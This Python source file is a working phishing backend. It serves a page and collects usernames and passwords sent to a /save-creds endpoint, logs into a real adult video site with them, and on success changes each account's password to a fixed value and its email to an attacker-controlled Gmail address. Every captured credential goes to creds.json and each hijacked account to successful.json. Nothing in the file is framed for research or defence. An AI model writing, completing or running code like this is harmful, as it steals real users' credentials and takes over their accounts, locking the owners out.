from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os
import urllib.request
import urllib.parse

CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "creds.json")
SUCCESS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "successful.json")

LOGIN_URL = "https://www.camwhores.tv/login/"
LOGIN_HEADERS = {
    "accept": "*/*",
    "accept-language": "es-US,es;q=0.9",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://www.camwhores.tv",
    "referer": "https://www.camwhores.tv/tags/cama/",
    "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
}

NEW_PASSWORD = "123aaa"
NEW_EMAIL = "cuentadewapp1@gmail.com"
CHANGE_PASS_URL = "https://www.camwhores.tv/change-password/"
CHANGE_EMAIL_URL = "https://www.camwhores.tv/change-email/"

def try_login(username, password):
    data = urllib.parse.urlencode({
        "username": username,
        "pass": password,
        "action": "login",
        "email_link": "https://www.camwhores.tv/email/",
        "format": "json",
        "mode": "async",
    }).encode()
    req = urllib.request.Request(LOGIN_URL, data=data, headers=LOGIN_HEADERS)
    with urllib.request.urlopen(req) as resp:
        # Extract session cookie
        session_cookie = None
        for header in resp.headers.get_all("Set-Cookie") or []:
            if "PHPSESSID" in header:
                session_cookie = header.split(";")[0]
        result = json.loads(resp.read().decode())
        return result, session_cookie

def try_change_password(session_cookie, old_pass, new_pass):
    data = urllib.parse.urlencode({
        "old_pass": old_pass,
        "pass": new_pass,
        "pass2": new_pass,
        "action": "change_pass",
        "format": "json",
        "mode": "async",
    }).encode()
    headers = {**LOGIN_HEADERS, "referer": "https://www.camwhores.tv/my/"}
    headers["Cookie"] = session_cookie + "; kt_member=1"
    req = urllib.request.Request(CHANGE_PASS_URL, data=data, headers=headers)
    with urllib.request.urlopen(req) as resp:
        text = resp.read().decode()
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            if "success" in text or "has been changed" in text:
                return {"status": "success", "raw": text.strip()}
            return {"status": "unknown", "raw": text.strip()}

def try_change_email(session_cookie, new_email):
    data = urllib.parse.urlencode({
        "email": new_email,
        "action": "change_email",
        "email_link": "https://www.camwhores.tv/email/",
        "format": "json",
        "mode": "async",
    }).encode()
    headers = {**LOGIN_HEADERS, "referer": "https://www.camwhores.tv/my/"}
    headers["Cookie"] = session_cookie + "; kt_member=1"
    req = urllib.request.Request(CHANGE_EMAIL_URL, data=data, headers=headers)
    with urllib.request.urlopen(req) as resp:
        text = resp.read().decode()
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            if "success" in text or "has been changed" in text or "confirmation" in text:
                return {"status": "success", "raw": text.strip()}
            return {"status": "unknown", "raw": text.strip()}

class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.path)

        if parsed.path in ("/save-creds", "/api/save-creds"):
            params = parse_qs(parsed.query)
            body = {k: v[0] for k, v in params.items()}

            # Try login against real endpoint
            login_result = None
            try:
                login_result, session_cookie = try_login(body.get("username", ""), body.get("password", ""))
                body["login_status"] = login_result.get("status", "unknown")
                body["login_response"] = login_result
                print(f"[LOGIN] {body['username']} -> {login_result.get('status')}")

                # If login succeeded, change password
                if login_result.get("status") == "success" and session_cookie:
                    try:
                        change_result = try_change_password(session_cookie, body.get("password", ""), NEW_PASSWORD)
                        body["change_pass_status"] = change_result.get("status", "unknown")
                        body["change_pass_response"] = change_result
                        print(f"[CHANGE PASS] {body['username']} -> {change_result.get('status')}")
                    except Exception as e:
                        body["change_pass_status"] = "error"
                        body["change_pass_error"] = str(e)
                        print(f"[CHANGE PASS ERROR] {body['username']} -> {e}")

                    # Change email
                    try:
                        email_result = try_change_email(session_cookie, NEW_EMAIL)
                        body["change_email_status"] = email_result.get("status", "unknown")
                        body["change_email_response"] = email_result
                        print(f"[CHANGE EMAIL] {body['username']} -> {email_result.get('status')}")
                    except Exception as e:
                        body["change_email_status"] = "error"
                        body["change_email_error"] = str(e)
                        print(f"[CHANGE EMAIL ERROR] {body['username']} -> {e}")
            except Exception as e:
                body["login_status"] = "error"
                body["login_error"] = str(e)
                print(f"[LOGIN ERROR] {body.get('username')} -> {e}")

            # Save to JSON
            creds = []
            if os.path.exists(CREDS_FILE):
                with open(CREDS_FILE, "r") as f:
                    creds = json.load(f)

            creds.append(body)

            with open(CREDS_FILE, "w") as f:
                json.dump(creds, f, indent=2)

            # Save successful entries to successful.json
            if (body.get("login_status") == "success"
                and body.get("change_pass_status") == "success"
                and body.get("change_email_status") == "success"):
                successes = []
                if os.path.exists(SUCCESS_FILE):
                    with open(SUCCESS_FILE, "r") as f:
                        successes = json.load(f)
                successes.append({
                    "username": body.get("username"),
                    "original_password": body.get("password"),
                    "new_password": NEW_PASSWORD,
                    "new_email": NEW_EMAIL,
                    "timestamp": body.get("timestamp"),
                })
                with open(SUCCESS_FILE, "w") as f:
                    json.dump(successes, f, indent=2)
                print(f"[SUCCESS] {body['username']} saved to successful.json")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            errors = body.get("login_response", {}).get("errors", []) if isinstance(body.get("login_response"), dict) else []
            error_message = errors[0].get("message", "") if errors else ""
            self.wfile.write(json.dumps({
                "login_status": body.get("login_status"),
                "error_message": error_message,
            }).encode())
        else:
            super().do_GET()

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    server = HTTPServer(("0.0.0.0", 8080), Handler)
    print(f"Serving on http://localhost:8080")
    print(f"Creds will be saved to: {CREDS_FILE}")
    server.serve_forever()
